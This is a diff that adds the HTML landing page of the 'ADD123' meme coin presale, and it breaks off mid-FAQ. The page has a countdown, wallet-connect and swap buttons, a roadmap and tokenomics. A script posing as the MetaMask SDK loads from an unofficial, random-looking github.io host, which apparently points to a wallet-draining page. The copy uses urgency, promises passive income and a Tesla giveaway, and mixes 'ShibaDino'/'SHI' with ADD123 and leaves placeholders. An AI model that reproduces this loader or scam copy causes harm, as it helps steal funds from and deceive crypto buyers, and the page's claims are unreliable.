@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Meta -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    
+	<!-- Title -->
+	<title>ADD123 | Hyper-Deflationary | Meme Coin</title>
+    
+	<!-- Favicon icon -->
+    <link rel="icon" type="image/png" href="images/favicon.png">
+    
+	<!-- Stylesheet -->
+    <link href="vendor/bootstrap-select/bootstrap-select.min.css" rel="stylesheet">
+	<link href="vendor/owl-carousel/owl.carousel.css" rel="stylesheet">
+	<link href="vendor/animate/animate.css" rel="stylesheet">
+	<link href="vendor/lightgallery/css/lightgallery.min.css" rel="stylesheet">
+	
+	<!-- Custom Stylesheet -->
+    <link rel="stylesheet" href="css/style.css">
+	<link rel="stylesheet" href="css/component.css">
+	<link class="skin" rel="stylesheet" href="css/skin/skin-3.css">
+	
+	<!-- script -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+	<!-- Metamask -->
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
+	<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.min.js" integrity="sha512-MerZH07NkRh+wvspHBb46VQUYj/UBBmYIBtsXLSWms8Yy8RqdkG2x09puc5OkGRNwG+QfIU5ZBapUSnutI805w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  </head>
+  <body>
+
+    <div id="loading-area" class="loading-03"></div>
+<div class="page-wraper">
+	<!-- Header -->
+	<header class="site-header header mo-left header-transparent">
+		<!-- Main Header -->
+		<div class="sticky-header main-bar-wraper navbar-expand-lg">
+			<div class="main-bar clearfix ">
+				<div class="container clearfix">
+					<!-- Website Logo -->
+					<div class="logo-header  logo-white">
+						<a href="index.html"><img class="logo-3" src="images/logo-soldier-metaadd123-header.png" alt="Soldier metaadd123"></a>
+					</div>
+					<!-- Nav Toggle Button -->
+					<button class="navbar-toggler collapsed navicon justify-content-end" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+						<span></span>
+						<span></span>
+						<span></span>
+					</button>
+					<!-- Extra Nav -->
+					<div class="extra-nav">
+						<div class="extra-cell">
+							<a href="https://pancakeswap.finance/swap?outputCurrency=CA" class="btn gradient-btnn btn-primary">BUY NOW</a> 
+						</div>
+					</div>
+					<div class="header-nav navbar-collapse collapse justify-content-end" id="navbarNavDropdown">
+						<div class="logo-header">
+							<a href="index.html"><img src="images/logo-doctor-metaadd123-header.png" alt=""></a>
+						</div>
+						<ul class="nav navbar-nav navbar">	
+							<li class="active"><a href="#home"><span>HOME</span></a></li>
+						</ul>
+						<ul class="nav navbar-nav navbar">	
+						  <li class="active"><a href="#whyADD1234"><span>WHY $ADD1234</span></a></li>
+						</ul>
+						<ul class="nav navbar-nav navbar">	
+							<li class="active"><a href="#ecosystem"><span>ECOSYSTEM</span></a></li>
+						</ul>
+						<ul class="nav navbar-nav navbar">	
+							<li class="active"><a href="https://pancakeswap.finance/swap?outputCurrency=CA"><span>BUY NOW</span></a></li>
+						</ul>
+						<ul class="nav navbar-nav navbar">	
+							
+							<li class="active"><a href="#tokenomics"><span>TOKENOMICS</span></a></li>
+						</ul>
+						<div class="dlab-social-icon">
+							<ul>
+								<li><a class="fa fa-twitter" href="https://www.twitter.com/ADD123Coin"></a></li>
+								<li><a class="fa fa-telegram" href="https://t.me/ADD123Coin"></a></li>
+							</ul>
+						</div>		
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- Main Header End -->
+	</header>
+	<!-- Header End -->
+	
+	<div class="page-content bg-white">
+				<!-- Slider -->
+		<div id="home" class="banner-three bg-primary p-t100" style="background-image: url(images/background/bg1.png), url(images/background/bg6.png), var(--gradient-seco);">
+			<div class=" banner-inner">
+				<div class=" align-items-center">
+					<div class="">
+						<div class="banner-content  ">
+							<div class="text-center modulazo" style="">
+								<div class="text-white p-3 fwa" style="background-color: black;border-radius: 1rem 1rem 0rem 0rem;">
+									<p>ShibaDino presale ending in:</p>
+									<div class="d-flex justify-content-center mb-3" style="gap:1rem">
+										<div id="days" class="rounded-3 time-card text-center">01d</div>
+										<div id="hours" class="rounded-3 time-card text-center">12h</div>
+										<div id="mins" class="rounded-3 time-card text-center">42m</div>
+										<div id="secs" class="rounded-3 time-card text-center">19s</div>
+									</div>
+									<p>LAST CHANCE TO BUY BEFORE TIER 1 EXCHANGE LISTINGS! FINAL STAGE!</p>
+									<p>Over $X Raised</p>
+								</div>
+								<div class=" bg-white p-3" style="color:black; border-radius: 0rem 0rem 1rem 1rem;
+								border:2px solid black">
+									<div class="separator mb-3">1 SHI = $<span id="rate_price">0.0337</span></div>
+									<div class="d-flex justify-content-center mb-3" style="gap:1rem">
+										<button onclick="payMethodChange(0)" id="b_eth" class="payMethod ">
+											<img  height="10" alt="" src="images/eth.svg">
+											<span  class="ps-2 font-14 mt-1">ETH</span>
+										</button>
+										<button onclick="payMethodChange(1)"  id="b_usdt" class="payMethod actived">
+											<img  height="10" alt="" src="images/usdt.svg">
+											<span  class="ps-2 font-14">USDT</span>
+										</button>
+										<button onclick="payMethodChange(2)"  id="b_bnb" class="payMethod">
+											<img  height="10" alt="" src="images/bnb.svg">
+											<span  class="ps-2 font-14">BNB</span>
+										</button>
+									</div>
+									<div class="d-flex justify-content-center mb-3" style="gap:1rem">
+										<div class="input-group input-main">
+											<label>Amount in <b>ETH</b> you pay<span class="float-right fw-bold" style="font-weight: 800">MAX</span></label>
+											<input id="amount_in" class="form-control  rounded-pill mr-1 pr-5" type="text" value="0">
+											<span class="input-group-append">
+												<img id="payingCurrencyImg"  class="img-input" src="images/usdt.svg">
+											</span>
+										</div>
+										<div class="input-group input-main">
+											<label>Amount in <b>SHI</b> you receive</label>
+											<input id="amount_out"  class="form-control  rounded-pill mr-1 pr-5" type="text" value="0">
+											<span class="input-group-append">
+												<img id="receivingCurrencyImg"  class="img-input" src="">
+											</span>
+										</div>
+									</div>
+									<button class="botones black  mb-2 w-100 " id="btn-connect">Connect Wallet</button>
+									<div id="connected" style="display: none">
+
+										<button class="btn btn-primary" id="btn-disconnect">
+										  Disconnect wallet
+										</button>
+							
+										<hr>
+							
+										<div id="network">
+										  <p>
+											<strong>Connected blockchain:</strong> <span id="network-name"></span>
+										  </p>
+							
+										  <p>
+											<strong>Selected account:</strong> <span id="selected-account"></span>
+										  </p>
+							
+										</div>
+							
+										<hr>
+							
+										<h3>All account balances</h3>
+							
+										<table class="table table-listing">
+										  <thead>
+											<th>Address</th>
+											<th>ETH balance</th>
+										  </thead>
+							
+										  <tbody id="accounts">
+										  </tbody>
+										</table>
+							
+										<p>Please try to switch between different accounts in your wallet if your wallet supports this functonality.</p>
+							
+									  </div>
+									<button class="botones black  mb-2 w-100 " style="display: none;" id="swap" onclick="swap()">Swap</button>
+									<button class="botones white  mb-2 w-100 ">Buy with BNB</button>
+									<button class="botones  gray  mb-2 w-100 ">How To Buy</button>
+								</div>
+							</div>
+						</div>
+					</div>
+					
+				</div>
+
+          <div class="dz-media wow fadeIn" data-wow-delay="1s" data-wow-duration="3s">
+            <img src="images/main-slider/meta-soldier.png" class="move-1" alt="">
+          </div>
+        
+			</div>
+		</div>
+		
+		<!-- about soldier -->
+		<section id="whyADD1234" class="content-inner-2" style="background-image: url(images/background/bg2.png); background-size: cover; background-position: top center; background-repeat: no-repeat;">
+			<div class="container">
+				<div class="section-head style-1 text-center">
+					<h2><img src="images/titles/why.png" class="move-4" style="padding-bottom: 10px	"></h2>
+					<h6 class="sub-title text-sub-primary m-b10" style="color: #ECECEC">is a hyper-deflationary decentralized, community-driven project</br>designed to become more scarce over time.</h6>
+				</div>
+				<div class="row">
+							<div class="col-lg-4 col-md-6 col-sm-12">						
+						<div class="icon-bx-wraper style-7 text-center m-lg-b30">
+							<div class="icon-media"> 
+
+								<img src="images/soldier/passive-income.gif" width="215" alt=""/>
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title">Passive income</h4>
+								<p>10% of each transaction is redistributed to token holders. That means you can earn more ADD123 Coins by just holding them in your wallet.</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-4 col-md-6 col-sm-12">
+						<div class="icon-bx-wraper style-7 text-center m-lg-b30">
+							<div class="icon-media"> 
+								<img src="images/soldier/liquidity.gif" width="215" alt=""/>
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title">Locked liquidity</h4>
+								<p>We want to make sure that all of our investors are protected, which is why we're locking ADD123 LP Tokens. For the sake of security and trust in our $ADD1234 community!</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-4 col-md-6 col-sm-12 offset-lg-0 offset-md-3">
+						<div class="icon-bx-wraper style-7 text-center ">
+							<div class="icon-media"> 
+								<img src="images/soldier/burn.gif" width="215" alt=""/>
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title">Burn</h4>
+								<p>Coins are burned automarically with every transaction, also we plan manual burns every month. This will help the price per token to grow.</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+	
+		
+		<!-- Clients Logo -->
+		<div class="content-inner-3">
+			<div class="container">
+				<div class="clients-carousel owl-none owl-carousel m-b30 style-2">
+					<div class="item">
+						<div class="clients-logo">
+							<img class="logo-main" src="images/logo-partners/amb-logo-green.png" alt="">
+							<img class="logo-hover" src="images/logo-partners/amb-logo-white.png" alt="">
+						</div>
+					</div>
+					<div class="item">
+						<div class="clients-logo">
+							<img class="logo-main" src="images/logo-partners/df-logo-green.png" alt="">
+							<img class="logo-hover" src="images/logo-partners/df-logo-white.png" alt="">
+						</div>
+					</div>
+					<div class="item">
+						<div class="clients-logo">
+							<img class="logo-main" src="images/logo-partners/yf-logo-green.png" alt="">
+							<img class="logo-hover" src="images/logo-partners/yf-logo-white.png" alt="">
+						</div>
+					</div>
+					<div class="item">
+						<div class="clients-logo">
+							<img class="logo-main" src="images/logo-partners/bsc-logo-green.png" alt="">
+							<img class="logo-hover" src="images/logo-partners/bsc-logo-white.png" alt="">
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+		
+		
+		<!-- rewards for holders -->
+		<section class="content-inner" style="background-image: url(images/pattern/bg6.png); background-size: cover, 200%; background-repeat: no-repeat;">
+			<div class="container">
+				<div class="row align-items-center">
+					<div class="col-lg-6 m-b30 d-lg-block">
+						<div class="dz-media left-ml ">
+							<img src="images/soldier/reward-for-holders.png" class="move-2" alt="Soldier metaadd123">
+						</div>
+					</div>
+					<div class="col-lg-6">
+					  <div class="section-head style-3">
+						  <h2><img src="images/titles/rewards.png" class="move-4" \></h2>
+						</div>
+						<div class=" style-1 left box-hover m-b30 wow fadeInRight" data-wow-duration="2s" data-wow-delay="0.4s">
+							<div class="icon-content">
+								<p>Soldier metaadd123 love his holders!</p>
+								<p>10% of each transaction is redistributed to token holders. The community receives more ADD123 Coins from the fees generated each transaction. That means you can earn more ADD123 Coins by just holding them in your wallet. You can seamlessly monitor the growth of your holdings in real-time.</p>
+							</div>
+						</div>
+						<div class="style-3 m-b30">
+							<h4 class="title">Just hold ADD123 and enjoy growing number of coins at your wallet!</h4>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+
+	<!-- ECOSYSTEM -->
+		<section id="ecosystem" class="content-inner primaryicon">
+			<div class="container">
+				<div class="section-head style-3 text-center">
+					<h2><img src="images/titles/ecosystem.png" class="move-4"></h2>
+					<h6 class="sub-title text-sub-primary" style="color: #ECECEC">COMING SOON</h6>
+				</div>
+				<div class="row">
+					<div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.2s">
+						<div class="icon-bx-wraper style-5 box-hover text-center m-b30">
+							<div class="icon-bx"> 
+								<span class="icon-cell"><i class="flaticon-vector"></i></span> 
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title m-b15">Lottery</h4>
+								<p>Feeling lucky? We’ve built</br>a daily lottery system that you can place bets with $ADD1234 coins.</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.4s">
+						<div class="icon-bx-wraper style-5 box-hover text-center m-b30">
+							<div class="icon-bx"> 
+								<span class="icon-cell"><i class="flaticon-chart"></i></span> 
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title m-b15">NFT Market</h4>
+								<p>Our largest project is our NFT marketplace. All transaction fees will be collected and placed in</br>a locked liquidity pool, helping the price grow.</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-3 col-md-6 offset-lg-0 offset-md-3 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.6s">
+						<div class="icon-bx-wraper style-5 box-hover text-center m-b30">
+							<div class="icon-bx"> 
+								<span class="icon-cell"><i class="flaticon-coding"></i></span> 
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title m-b15">Giveaways</h4>
+								<p>Invested in $ADD1234? Nothing else needs to be done, you have already entered our daily giveaways daily prizes.</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-3 col-md-6 offset-lg-0 offset-md-3 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.6s">
+						<div class="icon-bx-wraper style-5 box-hover text-center m-b30">
+							<div class="icon-bx"> 
+								<span class="icon-cell"><i class="flaticon-promotion"></i></span> 
+							</div>
+							<div class="icon-content">
+								<h4 class="dlab-title m-b15">Merch Store</h4>
+								<p>Special ADD123 clothing available via our</br>e-commerce website, with </br>a limited quantity.</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+
+	<!-- What we'll do -->
+		<section class="content-inner-3 wow fadeIn" data-wow-duration="2s" data-wow-delay="0.6s" style="background-image: url(images/pattern/bg6.png), var(--gradient-sec2); background-size: cover, 200%; background-repeat: no-repeat;">
+			<div class="container">
+				<div class="section-head style-1 text-center">
+					<h2><img src="images/titles/roadmap.png" class="move-4" style="margin-bottom: 20px;"></h2></br>
+				</div>
+				<div class="row align-items-center">
+					<div class="col-lg-6 m-b30 wow fadeIn" data-wow-duration="2s" data-wow-delay="0.2s">
+						<div class="dlab-accordion" id="accordionFaq">
+							<div class="card">
+								<div class="card-header" id="Birth">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseOne" aria-expanded="false" aria-controls="collapseZero">
+											Soldier
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseOne" class="collapse" aria-labelledby="Birth" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 01</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>Rigorous marke ng scheme to get the project spreading.</li>
+										<li>Meme development.</li>
+										<li>Website Launch.</li>
+										<li>3,000 active members.</li>
+										<li>Birth of ADD123.</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="Crawl">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseOne">
+											Lieutenant
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseTwo" class="collapse" aria-labelledby="Crawl" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 02</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>Partnering with social influencers to inch us ahead.</li>
+										<li>Coinmarketcap Listing.</li>
+										<li>Coingecko listing.</li>
+										<li>10,000 Holders.</li>
+										<li>15,000 active members.</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqThree">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseOne">
+											Captain
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseThree" class="collapse" aria-labelledby="faqThree" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 03</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>Scheduled 3rd Party audit.</li>
+										<li>Launch of the ADD123 merch store for our community.</li>
+										<li>Charity parnership with a verified climate change organization.</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqFour">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseFour" aria-expanded="false" aria-controls="collapseOne">
+											Major
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseFour" class="collapse" aria-labelledby="faqFour" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 04</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>50,000 Holders.</li>
+										<li>75,000 active members.</li>
+										<li>Biggest influencer push by a BSC token.</li>
+										<li>Venturing into major CEX for listings.</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqFive">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseFive" aria-expanded="false" aria-controls="collapseOne">
+											Colonel
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseFive" class="collapse" aria-labelledby="faqFive" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 05</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>100,000 Holders.</li>
+										<li>Revamped marketing.</li>
+										<li>Redesigning the project (website, meme addition).</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+														<div class="card">
+								<div class="card-header" id="faqSix">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseSix" aria-expanded="false" aria-controls="collapseOne">
+											General
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseSix" class="collapse" aria-labelledby="faqSix" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 06</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>200,000 Holders.</li>
+										<li>Launch of $ADD1234 NFT marketplace.</li>
+										<li>Launch of $ADD1234 Swap (DEX)</li>
+										<li>Tesla Giveaway for holders at 500M Market Cap.</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+														<div class="card">
+								<div class="card-header" id="faqSeven">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseSeven" aria-expanded="false" aria-controls="collapseOne">
+											Moon
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseSeven" class="collapse" aria-labelledby="faqSeven" data-parent="#accordionFaq">
+									<div class="card-body">
+									<h5 style="color: #5e7d33">Phase 07</h5>
+									<ul style="color: #a3a3a3" class="list-check primary-text m-b30">
+										<li>At 10B Market Cap, donate to a charity organiza on picked by the community.</li>
+										<li>At 50B Market Cap, Big ADD123 tokent lo ery for diamond hands holders.</li>
+										<li>At 100B Market Cap, the community creates a small but substantial al $ADD1234 forest, that will forever serve as the shining light to communities aﬀected by climate change.</li>
+									</ul>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-6 m-b30 wow fadeIn" data-wow-duration="2s" data-wow-delay="0.4s">
+						<img src="images/soldier/roadmap.png" class="move-2" alt="">
+					</div>
+				</div>
+			</div>
+		</section>
+	
+		
+		<!-- stickers and nfts -->
+		<section class="content-inner gradient-ss">
+			<div class="container">
+				<div class="section-head style-3 text-center">
+					<h2><img src="images/titles/stickers.png" class="move-4"></h2>
+					<h6 class="sub-title text-sub-primary" style="color: #ECECEC">Telegram Stickerpack available to install & use</h6>
+				</div>
+				<div class="row">
+				<ul class="wp-block-gallery columns-5 m-b30">
+					<li class="blocks-gallery-item"><img alt="" src="images/stickers/sticker1.png"></li>
+					<li class="blocks-gallery-item"><img alt="" src="images/stickers/sticker2.png"></li>
+					<li class="blocks-gallery-item"><img alt="" src="images/stickers/sticker3.png"></li>
+					<li class="blocks-gallery-item"><img alt="" src="images/stickers/sticker4.png"></li>
+					<li class="blocks-gallery-item"><img alt="" src="images/stickers/sticker5.png"></li>
+				</ul>
+				</div><div class="section-head style-1 text-center">
+						<h6 class="sub-title" style="color: #сссссс">Our exclusive original NFTS coming soon! It will be 1/1 unique NFT arts so stay tuned to grab them!</h6>
+				</div>
+			</div>
+		</section>
+		
+		
+	<!-- TOKENOMICS -->
+		<section id="tokenomics" class="content-inner-2 about-wraper-1" style="background-image: url(images/background/bg15.png); background-size: contain; background-position: center right; background-repeat: no-repeat;">
+			<div class="container">
+				<div class="row align-items-center">
+					<div class="col-lg-6 m-b30 wow fadeInLeft" data-wow-duration="2s" data-wow-delay="0.2s">
+						<div class="dz-media left">
+							<img src="images/takonomics/Soldier-tokenomics.png" alt="">
+						</div>
+					</div>
+					<div class="col-lg-6 wow fadeInRight" data-wow-duration="2s" data-wow-delay="0.4s">
+						<div class="section-head style-1">
+							<h2><img src="images/titles/tokenomics.png" class="move-4" style="margin-bottom: 20px;"></h2>
+						</div>
+						<div class="progress-bx overflow-hidden mb-3">
+							<div class="progress-info">
+								<span class="title">Holding rewards</span>
+								<span class="progress-value">10%</span>
+							</div>
+							<div class="progress mb-3">
+								<div class="progress-bar wow fadeInLeft" data-wow-duration="2s" data-wow-delay="0.6s" style="width: 15%"></div>
+							</div>
+						</div>
+						<div class="progress-bx overflow-hidden mb-3">
+							<div class="progress-info">
+								<span class="title">Liquidity provider fee</span>
+								<span class="progress-value">3%</span>
+							</div>
+							<div class="progress mb-3">
+								<div class="progress-bar wow fadeInLeft" data-wow-duration="2s" data-wow-delay="0.6s" style="width: 8%"></div>
+							</div>
+						</div>
+						<div class="progress-bx overflow-hidden mb-3">
+							<div class="progress-info">
+								<span class="title">Marketing fee</span>
+								<span class="progress-value">2%</span>
+							</div>
+							<div class="progress mb-3">
+								<div class="progress-bar wow fadeInLeft" data-wow-duration="2s" data-wow-delay="0.6s" style="width: 6%"></div>
+							</div>
+						</div>
+						<div class="icon-bx-wraper m-b30" data-wow-duration="2s" data-wow-delay="0.6s">
+							<div class="icon-content">
+								<h5 class="dlab-title m-b10" style="color:#607e34">Holding rewards</h5>
+								<p>From each transaction 10% is distributed to $ADD1234 holders. That means you can earn more $ADD1234 coins by simply holding them in your wallet.</p>
+								</div>
+						</div>
+						<div class="icon-bx-wraper m-b30" data-wow-duration="2s" data-wow-delay="0.6s">
+							<div class="icon-content">
+								<h5 class="dlab-title m-b10" style="color:#607e34">Liquidity provider fee</h5>
+								<p>A 3% fee is gathered from all transactions and is being automatically added to a locked liquidity pool.</p>
+								</div>
+						</div>
+						<div class="icon-bx-wraper m-b30" data-wow-duration="2s" data-wow-delay="0.6s">
+							<div class="icon-content">
+								<h5 class="dlab-title m-b10" style="color:#607e34">Marketing fee</h5>
+								<p>A 2% fee is gathered from all transactions and is being automatically added to a marketing wallet.</p>
+								</div>
+						</div>
+							</div>
+						</div>
+					</div>
+		</section>
+
+
+			
+		<!-- download our documents -->
+		<section class="content-inner-1 gradient-sec" style="background-image: url(images/background/bg23.png); background-size: cover; background-position: top center; background-repeat: no-repeat;">
+			<div class="container">
+				<div class="section-head style-3 text-center z mb-3">
+					<h2><img src="images/titles/download.png" class="move-4"></h2>
+					<h6 class="sub-title text-sub-primary" style="color: #ECECEC">You can find links to our official white paper below!</h6>
+					<p><button onclick="location.href='https://ADD123.com/doc/whitepaper.pdf'" class="btnn btnn-3 btnn-3b flaticon-boost-1">ADD1234 Paper</button><button onclick="location.href='https://www.coinscope.co/coin/1-ADD1234/audit'" class="btnn btnn-3 btnn-3b flaticon-boost-1" href="#">COINSCOPE AUDIT</button></p>
+				</div>
+					</div>
+		</section>
+
+<!-- Soldier metaadd123 merch -->
+		<section class="content-inner" style="background-image: url(images/background/bg21.png); ; background-size: contain; background-position: center; background-repeat: no-repeat; background-color: #242c2e">
+			<div class="container">
+				<div class="section-head style-3 text-center">
+					<h2><img src="images/titles/merch.png" class="move-4"></h2>
+					<h6 class="sub-title text-sub-primary"  style="color: #f4f4f4">A merchandise store avaliable only for ADD123 holders to proudly support their favorite coin in the real world. Also in addition to your rewards in ADD123 $ADD1234 Coins we will reward our supporters with physical items.</h6>
+				</div>
+				<div class="row">
+					<div class="col-xl-4 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.1s">
+						<div class="dlab-team style-1 m-b30">
+							<div class="dlab-media dlab-img-effect zoom zoom-slow">
+								<a style="pointer-events: none;"><img src="images/merch/1.jpg" alt=""></a>
+							</div>
+						</div>
+					</div>
+					<div class="col-xl-4 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.2s">
+						<div class="dlab-team style-1 m-b30">
+							<div class="dlab-media dlab-img-effect zoom zoom-slow">
+								<a style="pointer-events: none;"><img src="images/merch/2.jpg" alt=""></a>
+							</div>
+
+						</div>
+					</div>
+					<div class="col-xl-4 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.3s">
+						<div class="dlab-team style-1 m-b30">
+							<div class="dlab-media dlab-img-effect zoom zoom-slow">
+								<a style="pointer-events: none;"><img src="images/merch/3.jpg" alt=""></a>
+							</div>
+						</div>
+					</div>
+					<div class="col-xl-4 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.4s">
+						<div class="dlab-team style-1 m-b30">
+							<div class="dlab-media dlab-img-effect zoom zoom-slow">
+								<a style="pointer-events: none;"><img src="images/merch/4.jpg" alt=""></a>
+							</div>
+						</div>
+					</div>
+					<div class="col-xl-4 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.5s">
+						<div class="dlab-team style-1 m-b30">
+							<div class="dlab-media dlab-img-effect zoom zoom-slow">
+								<a style="pointer-events: none;"><img src="images/merch/5.jpg" alt=""></a>
+							</div>
+						</div>
+					</div>
+					<div class="col-xl-4 col-md-6 wow fadeInUp" data-wow-duration="2s" data-wow-delay="0.6s">
+						<div class="dlab-team style-1 m-b30">
+							<div class="dlab-media dlab-img-effect zoom zoom-slow">
+								<a style="pointer-events: none;"><img src="images/merch/6.jpg" alt=""></a>
+							</div>
+						</div>
+					</div>
+					</div><div class="section-head style-1 text-center">
+						<h6 class="sub-title" style="color: #сссссс">These items are ONLY for the real diamond holders.</h6>
+				</div>
+				</div>
+		</section>
+		
+	
+<!-- Faq -->
+		<section class="content-inner" style="background-image: url(images/background/bg22.png);">
+			<div class="container">
+				<div class="section-head style-1 text-center">
+					<h2><img src="images/titles/faq.png" class="move-4"></h2>
+					<h6 class="sub-title text-sub-primary" style="color: #ECECEC">Frequently Asked Questions</h6>
+				</div>
+				</div>
+			<div class="container">
+				<div class="row">
+					<div class="col-lg-8 m-auto wow fadeIn" data-wow-duration="2s" data-wow-delay="0.2s">
+						<div class="dlab-accordion" id="accordionFaq">
+							<div class="card">
+								<div class="card-header" id="faqTwo3">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseTwo3" aria-expanded="false" aria-controls="collapseone3">
+											Contract address?
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseTwo3" class="collapse" aria-labelledby="faqTwo3" data-parent="#accordionFaq">
+									<div class="card-body text-sub-primary">
+										<p class="m-b0" style="color: #000">CA</p>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqFour3">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseFour3" aria-expanded="false" aria-controls="collapseThree3">
+											When is the fair-launch?
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseFour3" class="collapse" aria-labelledby="faqFour3" data-parent="#accordionFaq">
+									<div class="card-body text-sub-primary">
+										<p class="m-b0" style="color: #000">We’re fair-launching on 14 December 01:00 PM UTC</p>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqFive3">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseFive3" aria-expanded="false" aria-controls="collapseFour3">
+											Will it be available on PancakeSwap?
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseFive3" class="collapse" aria-labelledby="faqFive3" data-parent="#accordionFaq">
+									<div class="card-body text-sub-primary">
+										<p class="m-b0" style="color: #000">Yes, it will be available to purchase using BNB by <a href="index.html">clicking here</a>.</p>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqSix3">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseSix3" aria-expanded="false" aria-controls="collapseSix3">
+											Is the project audited?
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseSix3" class="collapse" aria-labelledby="faqSix3" data-parent="#accordionFaq">
+									<div class="card-body text-sub-primary">
+										<p class="m-b0" style="color: #000">We’re currently waiting for a response from DessertSwap, once received the official audit link will be placed here.</p>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqTSeven3">
